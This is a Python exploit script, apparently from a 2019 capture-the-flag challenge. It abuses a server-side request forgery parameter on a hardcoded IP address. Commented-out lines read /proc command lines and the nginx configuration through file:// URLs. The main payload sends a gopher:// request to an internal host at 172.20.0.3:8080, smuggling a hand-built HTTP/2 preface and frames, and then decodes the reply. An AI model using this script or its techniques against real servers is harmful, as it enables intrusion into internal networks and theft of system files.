#!/usr/bin/env python3
# -*- coding:utf-8 -*-
from urllib.parse import *
from hpack import Encoder, Decoder
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/01/28, 23:23
"""

import requests
import urllib3
from hyperframe.frame import *
urllib3.disable_warnings()

URL = 'https://40.73.33.181'

req = requests.Session()
req.verify = False
req.cert = False


def ssrf(url):
    url = URL+"/?url="+url
    print("[+] Request -> %s" % url)
    res = req.get(url)
    try:
        if res.status_code == 200:
            html = res.content.decode('utf-8')
            return html[html.find('</code>')+7:]
    except Exception as e:
        return res.content[res.content.find(b'</code>')+7:]


def genFrame(data):
    next_f = 0
    errn = 0
    while len(data) > next_f+9:
        print("[*] "+"-"*30)
        if errn > 2:
            break
        try:
            nframe, _len = Frame.parse_frame_header(
                data[next_f:next_f+9])
            nframe.parse_body(memoryview(data[next_f+9:next_f+9 + _len]))
            print("[+] Frame -> %s" % nframe)
            for i in nframe.__dict__:
                if i == 'data':
                    print("[+] Data:")
                    print("[+] ", Decoder().decode(nframe.data))
                    print("[+] ")
            next_f += _len + 9
        except Exception as e:
            print(e)
            errn += 1
            next_f += _len + 9
            continue


def parseFrame(path):
    frames = []
    f = SettingsFrame(0)
    # f.settings = {
    #     f.HEADER_TABLE_SIZE: 0xff,
    #     f.ENABLE_PUSH: 0,
    #     f.MAX_CONCURRENT_STREAMS: 5,
    #     f.INITIAL_WINDOW_SIZE: 0xff,
    #     f.MAX_HEADER_LIST_SIZE: 0xff
    # }
    frames.append(f.serialize())
    f = HeadersFrame(1)
    f.flags.add('END_STREAM')
    f.flags.add('END_HEADERS')
    header_data = [
        (':method', 'GET'),
        (':scheme', 'http'),
        (':path', '/'+path),
        (':authority', '127.0.0.1:8080'),
        ('cookie', 'v'),
        ('accept', '*')
    ]
    f.data = Encoder().encode(header_data)
    frames.append(f.serialize())
    data = b''.join(frames)
    return quote(data)


if __name__ == '__main__':
    # cmdline
    # for i in range(1, 30):
    #     print(ssrf('file:///proc/%d/cmdline' % i))
    # nginx.conf
    # print(ssrf('file:///etc/nginx/nginx.conf'))
    # 172.20.0.3:8080
    pl = 'gopher://172.20.0.3:8080/_'
    # 连接序言 PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n
    pl += quote(quote('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'))
    # 帧 Frames[]
    pl += quote(parseFrame(''))
    genFrame(ssrf(pl))
